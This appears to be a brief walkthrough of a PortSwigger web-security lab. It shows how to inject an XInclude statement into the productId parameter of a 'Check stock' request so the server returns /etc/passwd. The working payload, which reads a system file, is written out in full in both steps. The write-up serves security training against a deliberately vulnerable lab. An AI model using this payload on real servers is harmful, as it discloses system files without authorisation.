# Exploiting XInclude to retrieve files

## This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

## Because you don't control the entire XML document you can't define a DTD to launch a classic [XXE](https://portswigger.net/web-security/xxe) attack.

## To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.

---

### step 1

intercept check stock feature and send to repeater

_productId=1&storeId=1_

add

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### step2

productId=1&storeId=1
replace 1 from product id

```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
&storeId=1
```

send request
